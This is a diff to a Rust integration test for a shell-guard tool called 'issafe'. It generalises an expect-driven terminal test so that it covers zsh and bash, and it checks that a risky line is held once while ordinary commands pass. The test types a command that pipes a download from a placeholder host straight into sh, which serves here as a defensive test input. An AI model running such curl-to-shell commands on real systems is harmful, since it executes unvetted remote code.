@@ -17,11 +17,13 @@ proc settle {path} {
   }
   return [file exists $path]
 }
-spawn env PATH=$env(BIN_DIR):$env(PATH) PS1=READY> zsh -f -i
+spawn env PATH=$env(BIN_DIR):$env(PATH) PS1=READY> {*}$env(SHELL_CMD)
 expect "READY>"
-send "theirs() { : > $env(CHAIN); zle .accept-line }; zle -N accept-line theirs\r"
-expect "READY>"
-send "eval \"\$(issafe --shell-init zsh)\"\r"
+if {$env(CHAIN_SETUP) ne ""} {
+  send "$env(CHAIN_SETUP)\r"
+  expect "READY>"
+}
+send "eval \"\$(issafe --shell-init $env(GUARD_SHELL))\"\r"
 expect "READY>"
 file delete $env(CHAIN)
 send "touch $env(MARK); curl -s https://x.invalid/a | sh\r"
@@ -32,7 +34,7 @@ expect {
 if {[settle $env(MARK)]} { puts "ran on first Enter"; exit 1 }
 send "\r"
 if {![settle $env(MARK)]} { puts "did not run on second Enter"; exit 1 }
-if {![file exists $env(CHAIN)]} { puts "the earlier accept-line widget was skipped"; exit 1 }
+if {$env(CHAIN_SETUP) ne "" && ![file exists $env(CHAIN)]} { puts "the earlier accept-line widget was skipped"; exit 1 }
 send "echo plain > $env(PLAIN)\r"
 if {![settle $env(PLAIN)]} { puts "an ordinary command was held"; exit 1 }
 send "exit\r"
@@ -44,29 +46,57 @@ fn have(cmd: &str, arg: &str) -> bool {
     Command::new(cmd).arg(arg).output().is_ok()
 }
 
-#[test]
-fn risky_line_is_held_once_then_runs_and_plain_lines_pass() {
-    if !have("zsh", "--version") || !have("expect", "-v") {
-        eprintln!("zsh or expect not installed; skipping");
-        return;
-    }
+fn drive(shell_cmd: &str, guard_shell: &str, chain_setup: &str) {
     let bin = Path::new(env!("CARGO_BIN_EXE_issafe"));
     let dir = tempfile::tempdir().unwrap();
     let script = dir.path().join("drive.exp");
     std::fs::write(&script, DRIVER).unwrap();
+    let chain = dir.path().join("chained");
     let out = Command::new("expect")
         .arg("-f")
         .arg(&script)
         .env("BIN_DIR", bin.parent().unwrap())
+        .env("SHELL_CMD", shell_cmd)
+        .env("GUARD_SHELL", guard_shell)
+        .env(
+            "CHAIN_SETUP",
+            chain_setup.replace("CHAIN", &chain.to_string_lossy()),
+        )
         .env("MARK", dir.path().join("ran"))
-        .env("CHAIN", dir.path().join("chained"))
+        .env("CHAIN", &chain)
         .env("PLAIN", dir.path().join("plain"))
         .output()
         .unwrap();
     let stdout = String::from_utf8_lossy(&out.stdout);
     assert!(
         out.status.success() && stdout.contains("ok"),
-        "{stdout}\n{}",
+        "{guard_shell}: {stdout}\n{}",
         String::from_utf8_lossy(&out.stderr)
     );
+}
+
+#[test]
+fn zsh_guard_holds_once_then_runs_and_keeps_an_earlier_widget() {
+    if !have("zsh", "--version") || !have("expect", "-v") {
+        eprintln!("zsh or expect not installed; skipping");
+        return;
+    }
+    drive(
+        "zsh -f -i",
+        "zsh",
+        "theirs() { : > CHAIN; zle .accept-line }; zle -N accept-line theirs",
+    );
+}
+
+#[test]
+fn bash_guard_holds_once_then_runs() {
+    let modern = Command::new("bash")
+        .args(["-c", "(( BASH_VERSINFO[0] >= 4 ))"])
+        .status()
+        .is_ok_and(|s| s.success());
+    if !modern || !have("expect", "-v") {
+        eprintln!("bash 4+ or expect not installed; skipping");
+        return;
+    }
+    drive("bash --norc --noprofile -i", "bash", "");
 }
